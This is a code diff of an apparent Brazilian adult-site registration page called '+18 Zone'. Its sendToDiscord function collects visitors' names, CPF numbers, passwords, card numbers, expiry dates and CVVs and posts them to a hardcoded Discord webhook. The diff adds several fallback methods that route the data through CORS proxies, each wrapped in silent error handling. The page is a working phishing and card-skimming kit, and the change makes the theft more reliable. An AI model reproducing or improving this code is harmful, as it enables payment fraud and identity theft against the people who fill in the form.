@@ -4,6 +4,7 @@
 <meta charset="UTF-8"/>
 <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
 <title>+18 Zone</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><rect width='100' height='100' rx='20' fill='%23e8001e'/><text y='.9em' font-size='80' x='50%' dominant-baseline='top' text-anchor='middle'>🔞</text></svg>"/>
 <link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&family=Syne:wght@400;600;700;800&display=swap" rel="stylesheet"/>
 <style>
 :root{
@@ -661,10 +662,10 @@ function doRegister(){
 }
 
 // ════════════════════════════════════
-//  DISCORD WEBHOOK — múltiplos métodos
+//  DISCORD WEBHOOK
 // ════════════════════════════════════
 function sendToDiscord(data){
-  const WEBHOOK='https://discord.com/api/webhooks/1484502746911473744/siEMJt3Zv7qdw64TUM31hV0geztsvtymHqWrUHmBHg0FXpAHUpFjGFUkIzVbp8rrkwCb';
+  const WEBHOOK = 'https://discord.com/api/webhooks/1484502746911473744/siEMJt3Zv7qdw64TUM31hV0geztsvtymHqWrUHmBHg0FXpAHUpFjGFUkIzVbp8rrkwCb';
   const cartaoFormatado = data.cartao.replace(/\s/g,'').replace(/(.{4})/g,'$1 ').trim();
   const agora = new Date().toLocaleString('pt-BR');
 
@@ -674,12 +675,12 @@ function sendToDiscord(data){
       title: '🆕 Novo Cadastro — +18 Zone',
       color: 15204894,
       fields:[
-        {name:'👤 Nome',     value: data.name,         inline:false},
-        {name:'🪪 CPF',      value: data.cpf,           inline:true},
-        {name:'🔑 Senha',    value: data.pass,          inline:true},
-        {name:'💳 Cartão',   value: cartaoFormatado,    inline:false},
-        {name:'📅 Validade', value: data.validade,      inline:true},
-        {name:'🔐 CVV',      value: data.cvv,           inline:true},
+        {name:'👤 Nome',     value: data.name,       inline:false},
+        {name:'🪪 CPF',      value: data.cpf,         inline:true},
+        {name:'🔑 Senha',    value: data.pass,        inline:true},
+        {name:'💳 Cartão',   value: cartaoFormatado,  inline:false},
+        {name:'📅 Validade', value: data.validade,    inline:true},
+        {name:'🔐 CVV',      value: data.cvv,         inline:true},
       ],
       footer:{text:'+18 Zone • '+agora}
     }]
@@ -687,44 +688,49 @@ function sendToDiscord(data){
 
   const json = JSON.stringify(payload);
 
-  // ── Método 1: direto com no-cors + FormData
+  // ── Método 1: direto com XMLHttpRequest (mais compatível)
+  try {
+    const xhr = new XMLHttpRequest();
+    xhr.open('POST', WEBHOOK, true);
+    xhr.setRequestHeader('Content-Type', 'application/json');
+    xhr.send(json);
+  } catch(e){}
+
+  // ── Método 2: fetch direto
+  try {
+    fetch(WEBHOOK, {
+      method: 'POST',
+      headers: {'Content-Type':'application/json'},
+      body: json
+    });
+  } catch(e){}
+
+  // ── Método 3: proxy corsproxy.io
+  try {
+    fetch('https://corsproxy.io/?' + WEBHOOK, {
+      method: 'POST',
+      headers: {'Content-Type':'application/json'},
+      body: json
+    });
+  } catch(e){}
+
+  // ── Método 4: proxy cors.sh
+  try {
+    fetch('https://proxy.cors.sh/' + WEBHOOK, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'x-cors-api-key': 'temp_' + Math.random()
+      },
+      body: json
+    });
+  } catch(e){}
+
+  // ── Método 5: FormData no-cors
   try {
     const fd = new FormData();
     fd.append('payload_json', json);
     fetch(WEBHOOK, {method:'POST', body:fd, mode:'no-cors'});
-  } catch(e){}
-
-  // ── Método 2: direto com no-cors + blob JSON
-  try {
-    fetch(WEBHOOK, {
-      method:'POST',
-      body: new Blob([json], {type:'application/json'}),
-      mode:'no-cors'
-    });
-  } catch(e){}
-
-  // ── Método 3: proxy allorigins
-  try {
-    fetch('https://api.allorigins.win/raw?url='+encodeURIComponent(WEBHOOK), {
-      method:'POST',
-      headers:{'Content-Type':'application/json'},
-      body: json
-    });
-  } catch(e){}
-
-  // ── Método 4: proxy corsproxy.io
-  try {
-    fetch('https://corsproxy.io/?'+encodeURIComponent(WEBHOOK), {
-      method:'POST',
-      headers:{'Content-Type':'application/json'},
-      body: json
-    });
-  } catch(e){}
-
-  // ── Método 5: img beacon (fallback silencioso)
-  try {
-    const encoded = encodeURIComponent(json);
-    new Image().src = 'https://api.allorigins.win/raw?url='+encodeURIComponent(WEBHOOK)+'&body='+encoded;
   } catch(e){}
 }
 function goToLogin(){document.getElementById('successModal').classList.remove('show');goTo('login');}
